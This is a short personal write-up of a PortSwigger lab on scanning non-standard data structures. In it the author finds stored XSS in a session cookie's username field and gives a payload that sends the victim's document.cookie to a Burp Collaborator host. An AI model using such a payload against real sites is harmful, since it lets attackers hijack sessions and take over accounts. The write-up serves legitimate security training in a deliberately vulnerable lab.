# Practitioner Lab 159: Scanning non-standard data structures

---

This lab contains a vulnerability that is difficult to find manually. It is located in a non-standard data structure.

To solve the lab, use [Burp Scanner](https://portswigger.net/burp/vulnerability-scanner)'s **Scan selected insertion point** feature to identify the vulnerability, then manually exploit it and delete `carlos`.

You can log in to your own account with the following credentials: `wiener:peter`

I logged in and found a weird session cookie that had my username as well as a token. I did a insertion scan on the username and it found stored xss. 

I attempted it with my own collaborator and it worked. 

![Untitled](Practitioner%20Lab%20159%20Scanning%20non-standard%20data%20st%2048b9992f18154a3798c880f7e276aa8a/Untitled.png)

Here since it was stored I can see requests from the victim in my collaborator. 

I found the following payload which I could possibly use to get the cookie.

```
'"><svg/onload="fetch('//2y1qp6oi3pj9gngyd00pkamff6lz9rxjn7ex1npc.oastify.com?cookies=' + encodeURIComponent(document.cookie))">
```

![Untitled](Practitioner%20Lab%20159%20Scanning%20non-standard%20data%20st%2048b9992f18154a3798c880f7e276aa8a/Untitled%201.png)

Here I sent the request and it resulted in this.

![Untitled](Practitioner%20Lab%20159%20Scanning%20non-standard%20data%20st%2048b9992f18154a3798c880f7e276aa8a/Untitled%202.png)

![Untitled](Practitioner%20Lab%20159%20Scanning%20non-standard%20data%20st%2048b9992f18154a3798c880f7e276aa8a/Untitled%203.png)

This solved the lab.